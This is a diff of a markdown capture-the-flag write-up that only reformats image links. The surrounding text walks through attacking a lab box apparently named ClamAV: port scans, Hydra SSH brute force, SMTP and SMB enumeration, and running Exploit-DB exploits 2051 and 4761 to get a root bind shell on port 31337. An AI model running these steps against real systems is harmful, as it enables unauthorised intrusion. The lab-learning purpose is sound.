@@ -103,7 +103,7 @@ Results would show: **ClamAV was standard on Debian Sarge mail servers**
 
 ### Step 1: Initial Nmap Scan
 
-![[images/Pasted image 20260105110103.png]]
+![Pasted image 20260105110103](images/Pasted image 20260105110103.png)
 
 ```bash
 nmap -sV -sC 192.168.130.42
@@ -119,7 +119,7 @@ nmap -sV -sC 192.168.130.42
 
 ### Step 2: SSH Brute Force Attempt with Hydra
 
-![[images/Pasted image 20260105110403.png]]
+![Pasted image 20260105110403](images/Pasted image 20260105110403.png)
 
 ```bash
 hydra -L users.txt -P passwords.txt ssh://192.168.130.42
@@ -132,7 +132,7 @@ hydra -L users.txt -P passwords.txt ssh://192.168.130.42
 
 ### Step 3: SMTP Enumeration (Port 25)
 
-![[images/Pasted image 20260105110517.png]]
+![Pasted image 20260105110517](images/Pasted image 20260105110517.png)
 
 ```bash
 nc 192.168.130.42 25
@@ -150,7 +150,7 @@ EHLO test
 
 ### Step 4: Full Port Scan - Discovery of Port 60000
 
-![[images/Pasted image 20260105110643.png]]
+![Pasted image 20260105110643](images/Pasted image 20260105110643.png)
 
 ```bash
 nmap -p- 192.168.130.42
@@ -165,7 +165,7 @@ nmap -p- 192.168.130.42
 
 ### Step 5: Netcat to Port 60000
 
-![[images/Pasted image 20260105110723.png]]
+![Pasted image 20260105110723](images/Pasted image 20260105110723.png)
 
 ```bash
 nc 192.168.130.42 60000
@@ -180,7 +180,7 @@ nc 192.168.130.42 60000
 
 ### Step 6: SSH Connection Attempt on Port 60000
 
-![[images/Pasted image 20260105110837.png]]
+![Pasted image 20260105110837](images/Pasted image 20260105110837.png)
 
 ```bash
 ssh -p 60000 192.168.130.42
@@ -192,7 +192,7 @@ ssh -p 60000 192.168.130.42
 
 ### Step 7: Web Enumeration (Port 80)
 
-![[images/Pasted image 20260105110915.png]]
+![Pasted image 20260105110915](images/Pasted image 20260105110915.png)
 
 ```bash
 curl http://192.168.130.42
@@ -206,7 +206,7 @@ curl http://192.168.130.42
 
 ### Step 8: Binary to ASCII Conversion
 
-![[images/Pasted image 20260105111002.png]]
+![Pasted image 20260105111002](images/Pasted image 20260105111002.png)
 
 **Your note:** "Bin to ASCII reveals taunting message"
 
@@ -217,7 +217,7 @@ curl http://192.168.130.42
 
 ### Step 9: SMB Enumeration with NetExec (nxc)
 
-![[images/Pasted image 20260105111143.png]]
+![Pasted image 20260105111143](images/Pasted image 20260105111143.png)
 
 ```bash
 nxc smb 192.168.130.42
@@ -259,7 +259,7 @@ nmap -p22,25,80,139,199,445,60000 -sV -sC 192.168.130.42
 
 ### Step 11: Web Directory Brute Force
 
-![[images/Pasted image 20260105111647.png]]
+![Pasted image 20260105111647](images/Pasted image 20260105111647.png)
 
 ```bash
 feroxbuster -u http://192.168.130.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -276,7 +276,7 @@ feroxbuster -u http://192.168.130.42 -w /usr/share/wordlists/dirbuster/directory
 
 ### Step 12: Searchsploit for Sendmail
 
-![[images/Pasted image 20260105112017.png]]
+![Pasted image 20260105112017](images/Pasted image 20260105112017.png)
 
 ```bash
 searchsploit sendmail 8.13
@@ -290,7 +290,7 @@ searchsploit sendmail 8.13
 
 ### Step 13: Copy Exploit to Working Directory
 
-![[images/Pasted image 20260105112126.png]]
+![Pasted image 20260105112126](images/Pasted image 20260105112126.png)
 
 ```bash
 searchsploit -m 2051
@@ -304,7 +304,7 @@ cp /usr/share/exploitdb/exploits/.../2051.py .
 
 ### Step 14: Edit and Execute Sendmail Exploit
 
-![[images/Pasted image 20260105112247.png]]
+![Pasted image 20260105112247](images/Pasted image 20260105112247.png)
 
 ```bash
 # Edit exploit
@@ -326,7 +326,7 @@ python 2051.py
 
 ### Step 15: The Discovery - ClamAV Exploit
 
-![[images/Pasted image 20260105125453.png]]
+![Pasted image 20260105125453](images/Pasted image 20260105125453.png)
 
 **Your note:** *"This wasn't the right exploit, after looking up a walkthrough I found, this, but I'm not sure how I would have been able to deduce this other than the box name being ClamAV..."*
 
@@ -349,7 +349,7 @@ searchsploit clamav
 
 ### Step 16: Execute ClamAV Exploit
 
-![[images/Pasted image 20260105124937.png]]
+![Pasted image 20260105124937](images/Pasted image 20260105124937.png)
 
 ```bash
 searchsploit -m 4761
@@ -375,7 +375,7 @@ perl 4761.pl 192.168.130.42
 
 ### Step 17: Verify Reverse Shell Port
 
-![[images/Pasted image 20260105124956.png]]
+![Pasted image 20260105124956](images/Pasted image 20260105124956.png)
 
 ```bash
 nmap -p31337 192.168.130.42
@@ -391,7 +391,7 @@ nmap -p31337 192.168.130.42
 
 ### Step 18: Connect to Shell and Get Root Flag
 
-![[images/Pasted image 20260105125210.png]]
+![Pasted image 20260105125210](images/Pasted image 20260105125210.png)
 
 ```bash
 nc 192.168.130.42 31337
